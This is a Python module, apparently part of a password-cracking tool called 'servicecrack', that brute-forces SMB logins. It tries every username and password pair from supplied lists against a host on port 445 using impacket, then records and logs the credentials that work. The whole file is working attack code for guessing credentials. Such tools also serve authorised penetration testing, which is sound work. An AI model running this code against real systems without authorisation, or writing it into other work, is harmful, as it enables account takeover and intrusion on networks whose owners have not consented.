# coding: utf-8
from impacket import smb
from servicecrack.service.Base import BaseCrack
from servicecrack.utils.logg import Logging

logging = Logging("smb2")

service_name = "smb2"


class Smb2Crack(BaseCrack):
    def __init__(self, host, port, usernames, passwords):
        super(Smb2Crack, self).__init__(host, port, usernames, passwords, service_name)
        if not port:
            self.port = 445

    def run(self):
        for username in self.usernames:
            for password in self.passwords:
                self.crack(username, password)
        logging.info("brute {} ending".format(self.service_name))
        logging.info(self.result)

    def crack(self, username, password):
        logging.debug("start use {} {}".format(username, password))
        success = 0
        try:
            conn = smb.SMB('*SMBSERVER', remote_host=self.host, sess_port=self.port, timeout=self.timeout)
            conn.login(username, password)
            print(conn.get_server_os())
            logging.info("brute success :{} {}".format(username, password))
            success = 1
        except Exception as e:
            logging.debug(e)
            logging.debug("brute faild:{} {}".format(username, password))
            conn.close_session()
        finally:
            if not success:
                return
            conn.close_session()
            self.result.append({"username": username, "password": password})
